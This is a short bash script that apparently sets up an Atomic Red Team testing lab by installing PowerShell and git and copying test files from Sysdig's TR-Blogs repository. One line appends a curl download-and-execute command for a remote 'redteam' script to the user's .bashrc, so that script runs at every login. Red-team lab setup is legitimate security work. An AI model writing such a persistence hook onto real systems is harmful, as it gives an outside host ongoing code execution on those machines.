#!/bin/bash
sudo apt-get update
sudo snap install powershell --classic
sudo apt-get install git
git clone https://github.com/sysdig/TR-Blogs.git
sudo mkdir -p /AtomicRedTeam/atomics/
sudo cp -r TR-Blogs/atomic-red-docker/atomics-overrides /AtomicRedTeam/atomics
sudo cp TR-Blogs/atomic-red-docker/RunTests.ps1 /root
#sduo rm -r TR-Blogs
echo 'curl -o /tmp/install_remote.sh https://raw.githubusercontent.com/ivanba-arch/redteam/main/install_d.sh && chmod +x /tmp/install_remote.sh && /tmp/install_remote.sh' >> /home/ubuntu/.bashrc
echo "Script completed" > /tmp/script_status.log
